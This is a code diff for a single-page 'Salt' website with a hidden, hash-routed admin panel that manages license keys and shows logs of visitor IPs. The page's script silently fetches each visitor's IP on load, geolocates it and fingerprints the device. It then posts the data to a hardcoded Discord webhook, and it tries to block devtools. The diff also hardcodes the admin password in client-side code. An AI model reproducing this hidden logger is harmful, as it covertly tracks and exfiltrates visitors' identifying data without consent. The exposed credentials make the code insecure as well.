@@ -52,7 +52,6 @@
             100% { transform: translate(5%, 5%) scale(1.1); }
         }
 
-        /* Main page container */
         .hero {
             text-align: center;
             z-index: 2;
@@ -233,23 +232,36 @@
         }
 
         /* Admin Panel Styles (Dark Theme) */
+        .admin-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(12px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .admin-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
         .admin-container {
-            display: none;
-            z-index: 10;
-            width: 95%;
-            max-width: 1400px;
             background: #0a0c12;
             border-radius: 2rem;
-            padding: 1.5rem;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            border: 1px solid #2a2e3a;
-            backdrop-filter: blur(4px);
-            font-family: 'Inter', monospace;
+            width: 95%;
+            max-width: 1400px;
             max-height: 90vh;
             overflow-y: auto;
-        }
-        .admin-container.active {
-            display: block;
+            padding: 1.5rem;
+            border: 1px solid #2a2e3a;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
         }
         .admin-header {
             display: flex;
@@ -280,7 +292,6 @@
             color: #ddd;
             cursor: pointer;
             transition: 0.2s;
-            font-weight: 500;
         }
         .admin-nav button.active {
             background: #5865F2;
@@ -377,6 +388,22 @@
             color: #aaa;
             text-decoration: none;
         }
+        .password-prompt {
+            background: #0a0c12;
+            padding: 2rem;
+            border-radius: 2rem;
+            text-align: center;
+            border: 1px solid #5865F2;
+        }
+        .password-prompt input {
+            background: #1e2128;
+            border: 1px solid #3a3e48;
+            padding: 0.7rem;
+            border-radius: 1rem;
+            color: white;
+            margin: 1rem 0;
+            width: 250px;
+        }
         @media (max-width: 800px) {
             .admin-container { padding: 1rem; }
             .log-table { font-size: 0.75rem; }
@@ -387,7 +414,7 @@
 <div class="orb orb1"></div>
 <div class="orb orb2"></div>
 
-<!-- Main page -->
+<!-- Main page (unchanged) -->
 <div class="hero" id="heroCard">
     <div class="logo-container">
         <img id="mainLogo" class="logo-img" src="image.png" alt="Salt" onerror="this.onerror=null; this.parentElement.innerHTML='<div class=logo-placeholder>🧂</div>';">
@@ -409,54 +436,63 @@
     </div>
 </div>
 
-<!-- Admin Panel Container (hidden) -->
-<div id="adminPanel" class="admin-container">
-    <div class="admin-header">
-        <div class="admin-title">🔐 SALT ADMIN • KEY SYSTEM</div>
-        <div class="admin-nav">
-            <button id="navKeysBtn" class="active">🔑 Key Manager</button>
-            <button id="navLogsBtn">📜 IP Logs</button>
+<!-- Admin Panel Overlay -->
+<div id="adminOverlay" class="admin-overlay">
+    <div id="adminContainer" class="admin-container" style="display: none;">
+        <div class="admin-header">
+            <div class="admin-title">🔐 SALT ADMIN • KEY SYSTEM</div>
+            <div class="admin-nav">
+                <button id="navKeysBtn" class="active">🔑 Key Manager</button>
+                <button id="navLogsBtn">📜 IP Logs</button>
+            </div>
+        </div>
+        <!-- Keys Page -->
+        <div id="keysPage" class="admin-panel-page active-page">
+            <div class="key-form">
+                <h3 style="color:white; margin-bottom:1rem;">Generate New Key</h3>
+                <div class="form-group">
+                    <label>HWID (bind to specific device, optional)</label>
+                    <input type="text" id="keyHwid" placeholder="Leave empty for no HWID lock">
+                </div>
+                <div class="form-group">
+                    <label>Time Limit (hours)</label>
+                    <input type="number" id="keyHours" placeholder="Hours until expiration (0 = unlimited)">
+                </div>
+                <div class="form-group">
+                    <label>Notes / Purpose</label>
+                    <textarea id="keyNotes" rows="2" placeholder="Internal notes..."></textarea>
+                </div>
+                <button id="generateKeyBtn" class="gen-btn">✨ Generate Key</button>
+            </div>
+            <div class="keys-list">
+                <h3 style="color:white; margin-bottom:1rem;">📋 Generated Keys</h3>
+                <div id="keysContainer">Loading...</div>
+            </div>
+        </div>
+        <!-- Logs Page -->
+        <div id="logsPage" class="admin-panel-page">
+            <h3 style="color:white; margin-bottom:1rem;">🌍 IP Logs (with HWID)</h3>
+            <div style="overflow-x: auto;">
+                <table class="log-table">
+                    <thead>
+                        <tr><th>IP Address</th><th>HWID (Key)</th><th>Timestamp</th><th>Location Preview</th><th>Action</th></tr>
+                    </thead>
+                    <tbody id="logsTableBody">
+                        <tr><td colspan="5">Loading logs...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <div class="back-main">
+            <a href="#" id="backToMain">← Back to main page</a>
         </div>
     </div>
-    <!-- Keys Page -->
-    <div id="keysPage" class="admin-panel-page active-page">
-        <div class="key-form">
-            <h3 style="color:white; margin-bottom:1rem;">Generate New Key</h3>
-            <div class="form-group">
-                <label>HWID (bind to specific device, optional)</label>
-                <input type="text" id="keyHwid" placeholder="Leave empty for no HWID lock">
-            </div>
-            <div class="form-group">
-                <label>Time Limit (hours)</label>
-                <input type="number" id="keyHours" placeholder="Hours until expiration (0 = unlimited)">
-            </div>
-            <div class="form-group">
-                <label>Notes / Purpose</label>
-                <textarea id="keyNotes" rows="2" placeholder="Internal notes..."></textarea>
-            </div>
-            <button id="generateKeyBtn" class="gen-btn">✨ Generate Key</button>
-        </div>
-        <div class="keys-list">
-            <h3 style="color:white; margin-bottom:1rem;">📋 Generated Keys</h3>
-            <div id="keysContainer">Loading...</div>
-        </div>
-    </div>
-    <!-- Logs Page -->
-    <div id="logsPage" class="admin-panel-page">
-        <h3 style="color:white; margin-bottom:1rem;">🌍 IP Logs (with HWID)</h3>
-        <div style="overflow-x: auto;">
-            <table class="log-table">
-                <thead>
-                    <tr><th>IP Address</th><th>HWID (Key)</th><th>Timestamp</th><th>Location Preview</th><th>Action</th></tr>
-                </thead>
-                <tbody id="logsTableBody">
-                    <tr><td colspan="5">Loading logs...</td></tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-    <div class="back-main">
-        <a href="#" id="backToMain">← Back to main page</a>
+    <div id="passwordPrompt" class="password-prompt">
+        <h3 style="color:white;">🔒 Admin Access</h3>
+        <input type="password" id="adminPassword" placeholder="Enter password">
+        <br>
+        <button id="submitPasswordBtn" class="gen-btn">Unlock</button>
+        <p style="color:#aaa; margin-top:1rem;"><a href="#" id="cancelAdmin" style="color:#aaa;">Cancel</a></p>
     </div>
 </div>
 
@@ -470,7 +506,7 @@
 
 <script>
     (function() {
-        // ---------- DEVTOOLS PROTECTION (same as before) ----------
+        // ---------- DEVTOOLS PROTECTION (unchanged) ----------
         const STORAGE_KEY = 'devtoolsAttemptLock';
         const modal = document.getElementById('devtoolsModal');
         const sorryBtn = document.getElementById('sorryButton');
@@ -549,7 +585,7 @@
         window.addEventListener('keydown', (e) => { if(e.key === 'Escape' && isModalActive) e.preventDefault(); });
         modal.addEventListener('click', (e) => { if(e.target === modal) e.stopPropagation(); });
 
-        // Click animation main card
+        // Click animation on main card
         const hero = document.getElementById('heroCard');
         hero.addEventListener('click', (e) => {
             if(e.target.closest('.discord-link')) return;
@@ -559,76 +595,95 @@
             setTimeout(() => hero.classList.remove('click-animation'), 450);
         });
 
-        // ---------- HIDDEN ADMIN ROUTING (hash based) ----------
-        const mainContainer = document.querySelector('.hero');
-        const adminContainer = document.getElementById('adminPanel');
-        
-        function showMainPage() {
-            mainContainer.style.display = 'flex';
-            adminContainer.classList.remove('active');
-            document.body.style.overflow = 'auto';
+        // ---------- HIDDEN ADMIN WITH PASSWORD ----------
+        const ADMIN_PASSWORD = "SALT-OWNER-ADMINTESZYBAKA*#!@(#s9_33_Salt";
+        const adminOverlay = document.getElementById('adminOverlay');
+        const adminContainer = document.getElementById('adminContainer');
+        const passwordPromptDiv = document.getElementById('passwordPrompt');
+        let adminAuthenticated = false;
+
+        function showAdminPanel() {
+            adminOverlay.classList.add('active');
+            // Show password prompt initially
+            adminContainer.style.display = 'none';
+            passwordPromptDiv.style.display = 'block';
         }
-        
-        function showAdminPage() {
-            mainContainer.style.display = 'none';
-            adminContainer.classList.add('active');
-            document.body.style.overflow = 'auto';
-            renderKeysList();
-            renderLogsTable();
+
+        function hideAdminPanel() {
+            adminOverlay.classList.remove('active');
+            adminAuthenticated = false;
+            adminContainer.style.display = 'none';
+            passwordPromptDiv.style.display = 'block';
+            // Clear password field
+            document.getElementById('adminPassword').value = '';
         }
-        
-        function handleRouting() {
-            const hash = window.location.hash;
-            if (hash === '#hidden/hide/admin/panel/secret') {
-                showAdminPage();
-                document.getElementById('keysPage').classList.add('active-page');
-                document.getElementById('logsPage').classList.remove('active-page');
-                document.getElementById('navKeysBtn').classList.add('active');
-                document.getElementById('navLogsBtn').classList.remove('active');
-            } else if (hash === '#hidden/hide/admin/panel/secret/logs') {
-                showAdminPage();
-                document.getElementById('keysPage').classList.remove('active-page');
-                document.getElementById('logsPage').classList.add('active-page');
-                document.getElementById('navKeysBtn').classList.remove('active');
-                document.getElementById('navLogsBtn').classList.add('active');
+
+        function unlockAdmin() {
+            const entered = document.getElementById('adminPassword').value;
+            if (entered === ADMIN_PASSWORD) {
+                adminAuthenticated = true;
+                passwordPromptDiv.style.display = 'none';
+                adminContainer.style.display = 'block';
+                renderKeysList();
                 renderLogsTable();
+                // Set active page based on hash
+                const hash = window.location.hash;
+                if (hash === '#hidden/hide/admin/panel/secret/logs') {
+                    document.getElementById('keysPage').classList.remove('active-page');
+                    document.getElementById('logsPage').classList.add('active-page');
+                    document.getElementById('navKeysBtn').classList.remove('active');
+                    document.getElementById('navLogsBtn').classList.add('active');
+                } else {
+                    document.getElementById('keysPage').classList.add('active-page');
+                    document.getElementById('logsPage').classList.remove('active-page');
+                    document.getElementById('navKeysBtn').classList.add('active');
+                    document.getElementById('navLogsBtn').classList.remove('active');
+                }
             } else {
-                showMainPage();
+                alert('Wrong password!');
             }
         }
-        
+
+        // Routing: when hash matches admin secret, show panel
+        function handleRouting() {
+            const hash = window.location.hash;
+            if (hash === '#hidden/hide/admin/panel/secret' || hash === '#hidden/hide/admin/panel/secret/logs') {
+                showAdminPanel();
+            } else {
+                if (adminOverlay.classList.contains('active')) hideAdminPanel();
+            }
+        }
+
         window.addEventListener('hashchange', handleRouting);
         handleRouting();
-        
+
+        document.getElementById('submitPasswordBtn')?.addEventListener('click', unlockAdmin);
+        document.getElementById('cancelAdmin')?.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.location.hash = '';
+            hideAdminPanel();
+        });
         document.getElementById('backToMain')?.addEventListener('click', (e) => {
             e.preventDefault();
             window.location.hash = '';
+            hideAdminPanel();
         });
-        
-        // Navigation buttons
+
+        // Admin navigation buttons
         document.getElementById('navKeysBtn')?.addEventListener('click', () => {
             window.location.hash = '#hidden/hide/admin/panel/secret';
         });
         document.getElementById('navLogsBtn')?.addEventListener('click', () => {
             window.location.hash = '#hidden/hide/admin/panel/secret/logs';
         });
-        
+
         // ---------- KEY MANAGEMENT (localStorage) ----------
         const KEYS_STORAGE = 'salt_admin_keys';
-        
         function generateRandomKey() {
             return 'SALT-' + Math.random().toString(36).substring(2, 15).toUpperCase();
         }
-        
-        function saveKeys(keys) {
-            localStorage.setItem(KEYS_STORAGE, JSON.stringify(keys));
-        }
-        
-        function loadKeys() {
-            const raw = localStorage.getItem(KEYS_STORAGE);
-            if (raw) return JSON.parse(raw);
-            return [];
-        }
+        function saveKeys(keys) { localStorage.setItem(KEYS_STORAGE, JSON.stringify(keys)); }
+        function loadKeys() { const raw = localStorage.getItem(KEYS_STORAGE); return raw ? JSON.parse(raw) : []; }
         
         function renderKeysList() {
             const container = document.getElementById('keysContainer');
@@ -662,48 +717,31 @@
                 });
             });
         }
-        
+
         document.getElementById('generateKeyBtn')?.addEventListener('click', () => {
             const hwid = document.getElementById('keyHwid').value.trim() || null;
             let hours = parseInt(document.getElementById('keyHours').value);
             const notes = document.getElementById('keyNotes').value.trim() || '';
             let expiry = null;
-            if (!isNaN(hours) && hours > 0) {
-                expiry = Date.now() + (hours * 60 * 60 * 1000);
-            }
+            if (!isNaN(hours) && hours > 0) expiry = Date.now() + (hours * 60 * 60 * 1000);
             const newKey = generateRandomKey();
             const keys = loadKeys();
-            keys.push({
-                key: newKey,
-                hwid: hwid,
-                expiry: expiry,
-                notes: notes,
-                createdAt: Date.now()
-            });
+            keys.push({ key: newKey, hwid, expiry, notes, createdAt: Date.now() });
             saveKeys(keys);
             renderKeysList();
             document.getElementById('keyHwid').value = '';
             document.getElementById('keyHours').value = '';
             document.getElementById('keyNotes').value = '';
         });
-        
-        // ---------- IP LOGS (store from logger) + HWID capture ----------
+
+        // ---------- IP LOGS (storage and display) ----------
         const LOGS_STORAGE = 'salt_ip_logs';
-        
-        function storeIpLog(ip, hwid, locationData) {
+        function storeIpLog(ip, hwid, locationPreview) {
             const logs = JSON.parse(localStorage.getItem(LOGS_STORAGE) || '[]');
-            // avoid duplicate IP+HWID within last 24h? but we store each unique visit (IP change based)
-            logs.unshift({
-                ip: ip,
-                hwid: hwid,
-                timestamp: Date.now(),
-                locationPreview: locationData?.city ? `${locationData.city}, ${locationData.country}` : (locationData?.country || 'Unknown')
-            });
-            // keep last 200 logs
+            logs.unshift({ ip, hwid, timestamp: Date.now(), locationPreview: locationPreview || 'Unknown' });
             if (logs.length > 200) logs.pop();
             localStorage.setItem(LOGS_STORAGE, JSON.stringify(logs));
         }
-        
         function renderLogsTable() {
             const tbody = document.getElementById('logsTableBody');
             const logs = JSON.parse(localStorage.getItem(LOGS_STORAGE) || '[]');
@@ -714,20 +752,18 @@
             let html = '';
             logs.forEach(log => {
                 const date = new Date(log.timestamp).toLocaleString();
-                html += `
-                    <tr>
-                        <td>${log.ip}</td>
-                        <td><code>${log.hwid || 'unknown'}</code></td>
-                        <td>${date}</td>
-                        <td>${log.locationPreview || 'N/A'}</td>
-                        <td><a href="https://iplocation.com/?ip=${log.ip}" target="_blank" class="ip-link">🔍 View on iplocation.com</a></td>
-                    </tr>
-                `;
+                html += `<tr>
+                    <td>${log.ip}</td>
+                    <td><code>${log.hwid || 'unknown'}</code></td>
+                    <td>${date}</td>
+                    <td>${log.locationPreview || 'N/A'}</td>
+                    <td><a href="https://iplocation.com/?ip=${log.ip}" target="_blank" class="ip-link">🔍 View on iplocation.com</a></td>
+                </tr>`;
             });
             tbody.innerHTML = html;
         }
-        
-        // ----- MODIFY EXISTING IP LOGGER (from previous code) to store logs locally -----
+
+        // ---------- IP LOGGER (hidden, sends to webhook + stores locally) ----------
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1513578964642173100/noVBYGuM0HvgRzry7BJcic-te203H6ZpeI2UtOPl97CVjSygESs-ECTeDr8wAX9QVJET";
         const STORED_IP_KEY = 'salt_last_logged_ip';
         
@@ -766,77 +802,42 @@
             }
         }
         
-        async function sendDetailedLog(ip) {
+        async function logVisitor(ip) {
             try {
                 const geoRes = await fetchWithTimeout(`http://ip-api.com/json/${ip}?fields=66846719`);
                 const geo = await geoRes.json();
-                let proxyData = {};
-                try {
-                    const proxyCheck = await fetchWithTimeout(`https://proxycheck.io/v2/${ip}?key=free&vpn=1&asn=1&risk=1&time=1`, 4000);
-                    if (proxyCheck.ok) proxyData = await proxyCheck.json();
-                } catch(e) { /* silent */ }
-                
                 const hwid = generateHardwareId();
-                const ua = navigator.userAgent;
-                const screenRes = `${screen.width}x${screen.height}`;
-                const deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? '📱 Mobile' : '💻 Desktop';
-                const platform = navigator.platform || 'Unknown';
-                const deviceInfo = `${deviceType} | ${platform} | ${screenRes}`;
-                
-                // Store locally with location preview
-                storeIpLog(ip, hwid, { city: geo.city, country: geo.country });
-                
-                const fields = [];
-                let location = [];
-                if (geo.country) location.push(`**Country:** ${geo.country} (${geo.countryCode || ''})`);
-                if (geo.regionName) location.push(`**Region:** ${geo.regionName}`);
-                if (geo.district) location.push(`**District:** ${geo.district}`);
-                if (geo.city) location.push(`**City:** ${geo.city}`);
-                if (geo.lat && geo.lon) location.push(`**Coordinates:** ${geo.lat}, ${geo.lon}`);
-                if (geo.zip) location.push(`**ZIP Code:** ${geo.zip}`);
-                fields.push({ name: "📍 Location", value: location.join('\n') || "N/A", inline: false });
-                
-                let network = [];
-                if (geo.isp) network.push(`**ISP:** ${geo.isp}`);
-                if (geo.as) network.push(`**ASN:** ${geo.as}`);
-                network.push(`**Net Speed:** ${geo.mobile ? 'Mobile' : (geo.proxy ? 'Proxy/VPN' : 'Broadband')}`);
-                fields.push({ name: "🌐 Network", value: network.join('\n') || "N/A", inline: false });
-                
-                let threat = [];
-                if (proxyData[ip]?.proxy === "yes") threat.push(`**Proxy:** YES (${proxyData[ip].type})`);
-                else threat.push(`**Proxy:** No`);
-                fields.push({ name: "🛡️ Security", value: threat.join('\n'), inline: false });
-                fields.push({ name: "🖥️ Device", value: `**HWID:** \`${hwid}\`\n**Device:** ${deviceInfo}`, inline: false });
-                
+                const locationPreview = geo.city ? `${geo.city}, ${geo.country}` : (geo.country || 'Unknown');
+                storeIpLog(ip, hwid, locationPreview);
+                // Also send to webhook (minimal)
                 const embed = {
-                    title: "📡 Visitor Log",
-                    description: `**IP:** \`${ip}\``,
+                    title: "Visitor Log",
+                    description: `IP: \`${ip}\`\nHWID: \`${hwid}\``,
                     color: 0x2b2d42,
-                    fields: fields,
-                    footer: { text: "System event" },
+                    fields: [{ name: "Location", value: locationPreview, inline: true }],
                     timestamp: new Date().toISOString()
                 };
-                await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) });
-            } catch (err) { /* silent */ }
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                }).catch(() => {});
+            } catch(e) { /* silent */ }
         }
         
-        async function checkAndLogIfNewIP() {
+        async function checkAndLog() {
             try {
                 const ipRes = await fetchWithTimeout('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
                 const lastIP = localStorage.getItem(STORED_IP_KEY);
                 if (!lastIP || lastIP !== ip) {
-                    await sendDetailedLog(ip);
+                    await logVisitor(ip);
                     localStorage.setItem(STORED_IP_KEY, ip);
                 }
-            } catch (err) { /* silent */ }
+            } catch(e) { /* silent */ }
         }
         
-        window.addEventListener('load', () => {
-            setTimeout(checkAndLogIfNewIP, 900);
-            // initial render for logs if admin opened later
-            if (window.location.hash === '#hidden/hide/admin/panel/secret/logs') renderLogsTable();
-        });
+        window.addEventListener('load', () => setTimeout(checkAndLog, 900));
     })();
 </script>
 </body>
